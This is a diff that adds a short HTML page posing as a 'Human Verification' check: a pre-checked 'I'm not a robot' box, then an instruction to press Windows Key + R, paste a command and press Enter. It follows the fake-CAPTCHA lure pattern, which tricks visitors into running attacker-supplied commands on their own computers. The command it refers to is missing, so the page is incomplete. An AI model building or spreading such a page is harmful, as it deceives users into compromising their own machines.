@@ -1,0 +1,12 @@
+<h2>Human Verification</h2>
+<p>Please complete the verification to continue.</p>
+
+<form>
+  <label><input type="checkbox" disabled checked> I'm not a robot</label>
+</form>
+
+<p><b>Step 2:</b> To complete verification, copy and run the following command on your computer:</p>
+
+<p><i>(Press <b>Windows Key + R</b>, paste the command above, and press Enter)</i></p>
+
+<p><button disabled>Continue</button></p>
